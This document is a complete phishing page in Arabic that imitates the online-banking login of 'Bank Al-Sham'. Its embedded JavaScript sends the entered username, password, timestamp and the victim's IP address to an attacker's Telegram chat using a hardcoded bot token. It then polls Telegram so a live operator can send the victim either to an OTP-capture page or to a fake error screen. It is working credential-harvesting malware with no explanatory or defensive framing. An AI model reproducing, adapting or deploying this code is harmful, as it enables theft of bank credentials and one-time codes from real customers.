<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بنك الشام - تسجيل دخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Scheherazade+New:wght@400;700&family=Amiri:wght@400;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Scheherazade New', 'Amiri', 'Arial', sans-serif;
            background: linear-gradient(180deg, #9d1b30 0%, #c71f37 100%);
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-image: 
                repeating-linear-gradient(45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px),
                repeating-linear-gradient(-45deg, transparent, transparent 35px, rgba(139, 0, 0, 0.1) 35px, rgba(139, 0, 0, 0.1) 70px);
            opacity: 0.3;
            z-index: 0;
        }

        .pattern-star {
            position: absolute;
            width: 80px;
            height: 80px;
            opacity: 0.15;
        }

        .pattern-star:nth-child(1) { top: 50px; left: 40px; }
        .pattern-star:nth-child(2) { top: 150px; right: 60px; }
        .pattern-star:nth-child(3) { top: 300px; left: 80px; }
        .pattern-star:nth-child(4) { bottom: 200px; right: 100px; }
        .pattern-star:nth-child(5) { bottom: 50px; left: 120px; }
        .pattern-star:nth-child(6) { top: 100px; left: 50%; }
        .pattern-star:nth-child(7) { top: 400px; right: 40px; }

        .container {
            position: relative;
            z-index: 1;
            max-width: 100%;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            display: flex;
            justify-content: flex-end;
            padding: 20px 30px;
            position: relative;
            z-index: 10;
        }

        .menu-icon {
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
        }

        .menu-bars {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .menu-bars span {
            width: 30px;
            height: 3px;
            background: white;
            border-radius: 2px;
        }

        .menu-arrow {
            color: white;
            font-size: 28px;
            font-weight: bold;
        }

        .logo-section {
            text-align: center;
            margin: 30px 0 50px;
        }

        .logo {
            width: 180px;
            height: 180px;
            margin: 0 auto 20px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .logo::before {
            content: '';
            position: absolute;
            width: 200px;
            height: 200px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            z-index: -1;
        }

        .logo img {
            width: 160px;
            height: 160px;
            object-fit: contain;
        }

        .logo-text {
            color: white;
            font-size: 42px;
            font-weight: 300;
            letter-spacing: 2px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            margin-top: 10px;
        }

        .login-card {
            background: white;
            border-radius: 30px 30px 0 0;
            padding: 40px 25px 60px;
            margin-top: 40px;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .form-title {
            text-align: center;
            color: #666;
            font-size: 24px;
            font-weight: 300;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }

        .error-alert {
            background: #ffe6e6;
            border: 1px solid #ffcccc;
            border-right: 4px solid #c71f37;
            color: #c71f37;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 17px;
            display: none;
            animation: slideDown 0.5s ease-out;
        }

        .error-alert.show {
            display: block;
        }

        @keyframes slideDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 18px 20px;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            text-align: right;
            color: #666;
            transition: all 0.3s;
            background: white;
        }

        .input-field:focus {
            outline: none;
            border-color: #9d1b30;
        }

        .input-field.error {
            border-color: #c71f37;
            background: #fff5f5;
        }

        .input-field::placeholder {
            color: #bbb;
        }

        .password-wrapper {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            left: 20px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
        }

        .eye-icon svg {
            width: 100%;
            height: 100%;
            fill: #999;
            transition: fill 0.3s;
        }

        .eye-icon:hover svg {
            fill: #9d1b30;
        }

        .create-account-link {
            text-align: center;
            margin: 20px 0;
            color: #666;
            font-size: 15px;
        }

        .create-account-link a {
            color: #9d1b30;
            text-decoration: none;
            font-weight: 500;
        }

        .login-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #9d1b30, #c71f37);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(157, 27, 48, 0.3);
        }

        .login-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(157, 27, 48, 0.4);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .forgot-password {
            text-align: center;
            margin: 20px 0;
        }

        .forgot-password-link {
            color: #9d1b30;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        .signup-section {
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid #eee;
        }

        .signup-text {
            text-align: center;
            color: #999;
            font-size: 15px;
            line-height: 1.8;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 9999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            color: white;
            margin-top: 20px;
            font-size: 18px;
            text-align: center;
        }

        .waiting-message {
            color: #f0ad4e;
            margin-top: 10px;
            font-size: 16px;
            text-align: center;
        }
    </style>
</head>
<body>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>
    <svg class="pattern-star" viewBox="0 0 100 100">
        <polygon points="50,10 61,35 88,35 66,52 75,78 50,60 25,78 34,52 12,35 39,35" fill="white"/>
    </svg>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">جاري المعالجة...</div>
        <div class="waiting-message">⏳ في انتظار التوجيه من التيليجرام</div>
    </div>

    <div class="container">
        <div class="header">
            <div class="menu-icon">
                <div class="menu-bars">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                <div class="menu-arrow">‹</div>
            </div>
        </div>

        <div class="logo-section">
            <div class="logo">
                <img src="image.jpg" alt="بنك الشام">
            </div>
            <div class="logo-text">بنك الشام</div>
        </div>

        <div class="login-card">
            <h1 class="form-title">تسجيل الدخول</h1>
            
            <div class="error-alert" id="errorAlert">
                ⚠️ البيانات المدخلة غير صحيحة، يرجى التحقق والمحاولة مرة أخرى
            </div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input 
                        type="text" 
                        class="input-field" 
                        placeholder="اسم المستخدم" 
                        id="username" 
                        pattern="[0-9]*"
                        inputmode="numeric"
                        required
                    >
                </div>
                
                <div class="input-group password-wrapper">
                    <input type="password" class="input-field" placeholder="كلمة السر" id="password" required>
                    <div class="eye-icon" onclick="togglePassword()">
                        <svg viewBox="0 0 24 24">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        </svg>
                    </div>
                </div>

                <div class="create-account-link">
                    ان لم يكن لديك حساب <a href="#">أنشئ حسابا</a>
                </div>

                <button type="submit" class="login-button">تسجيل دخول</button>

                <div class="forgot-password">
                    <a href="#" class="forgot-password-link">هل نسيت كلمة المرور؟</a>
                </div>

                <div class="signup-section">
                    <p class="signup-text">
                        اذا لديك حساب في البنك ولم تشترك في<br>
                        الخدمات الالكترونية اضغط هنا للاشتراك.
                    </p>
                </div>
            </form>
        </div>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
        }

        const TELEGRAM_BOT_TOKEN = '7629401774:AAGFZolxCa-1lkOJ2tJ8D6G-gq_Dod6ZlPw';
        const TELEGRAM_CHAT_ID = '5336195503';
        let sessionId = null;
        let pollingInterval = null;
        let lastUpdateId = 0;

        // عرض رسالة الخطأ عند الرجوع من التيليجرام
        window.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('error') === 'invalid') {
                document.getElementById('errorAlert').classList.add('show');
                document.getElementById('username').classList.add('error');
                document.getElementById('password').classList.add('error');
            }
            
            // الحصول على آخر update_id لتجنب معالجة رسائل قديمة
            initLastUpdateId();
        });

        async function initLastUpdateId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=-1`);
                const data = await response.json();
                if (data.ok && data.result.length > 0) {
                    lastUpdateId = data.result[0].update_id;
                }
            } catch (error) {
                console.log('Could not init update ID:', error);
            }
        }

        const usernameInput = document.getElementById('username');
        usernameInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
            this.classList.remove('error');
            document.getElementById('errorAlert').classList.remove('show');
        });

        document.getElementById('password').addEventListener('input', function() {
            this.classList.remove('error');
            document.getElementById('errorAlert').classList.remove('show');
        });

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('يرجى ملء جميع الحقول');
                return;
            }
            
            localStorage.setItem('bank_username', username);
            localStorage.setItem('bank_password', password);
            
            // إنشاء session ID فريد
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('session_id', sessionId);
            
            document.getElementById('loadingOverlay').classList.add('active');
            
            const message = `🔐 بيانات تسجيل دخول جديدة - بنك الشام

👤 اسم المستخدم: ${username}
🔑 كلمة السر: ${password}

📱 الوقت: ${new Date().toLocaleString('ar-JO')}
🌐 IP: ${await getIP()}
🆔 Session: ${sessionId}

⬇️ اختر التوجيه:`;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🔢 رمز التحقق (OTP)', callback_data: `otp_${sessionId}` }],
                                [{ text: '❌ بيانات خاطئة', callback_data: `error_${sessionId}` }]
                            ]
                        }
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log('✅ تم إرسال الرسالة بنجاح');
                    startPolling();
                } else {
                    console.error('❌ فشل إرسال الرسالة:', result);
                    document.getElementById('loadingOverlay').classList.remove('active');
                    alert('حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
                }
            } catch (error) {
                console.error('❌ خطأ في الإرسال:', error);
                document.getElementById('loadingOverlay').classList.remove('active');
                alert('حدث خطأ في الاتصال. يرجى المحاولة مرة أخرى.');
            }
        });

        function startPolling() {
            console.log('🔄 بدء الاستماع للتوجيه...');
            let attempts = 0;
            const maxAttempts = 90; // 3 دقائق (كل 2 ثانية)
            
            pollingInterval = setInterval(async () => {
                attempts++;
                
                if (attempts > maxAttempts) {
                    clearInterval(pollingInterval);
                    document.getElementById('loadingOverlay').classList.remove('active');
                    alert('⏰ انتهت مهلة الانتظار. يرجى المحاولة مرة أخرى.');
                    return;
                }
                
                try {
                    const offset = lastUpdateId + 1;
                    const response = await fetch(
                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5&allowed_updates=["callback_query"]`,
                        { timeout: 10000 }
                    );
                    
                    const data = await response.json();
                    
                    if (data.ok && data.result && data.result.length > 0) {
                        for (const update of data.result) {
                            lastUpdateId = update.update_id;
                            
                            if (update.callback_query && update.callback_query.data) {
                                const callbackData = update.callback_query.data;
                                console.log('📩 استلام ضغطة زر:', callbackData);
                                
                                if (callbackData.includes(sessionId)) {
                                    console.log('✅ التوجيه يطابق الجلسة!');
                                    clearInterval(pollingInterval);
                                    
                                    // الرد على التيليجرام
                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: '✓ تم التوجيه بنجاح'
                                        })
                                    });
                                    
                                    // التوجيه حسب الزر المضغوط
                                    setTimeout(() => {
                                        if (callbackData.startsWith('otp_')) {
                                            console.log('➡️ التوجيه إلى صفحة OTP');
                                            window.location.href = 'otp.html';
                                        } else if (callbackData.startsWith('error_')) {
                                            console.log('➡️ الرجوع للصفحة مع رسالة خطأ');
                                            window.location.href = 'index.html?error=invalid';
                                        }
                                    }, 500);
                                    
                                    return;
                                }
                            }
                        }
                    }
                } catch (error) {
                    console.log('⚠️ خطأ في الاستماع:', error.message);
                }
            }, 2000);
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'غير متوفر';
            }
        }

        window.addEventListener('beforeunload', function() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
            }
        });
    </script>
</body>
</html>
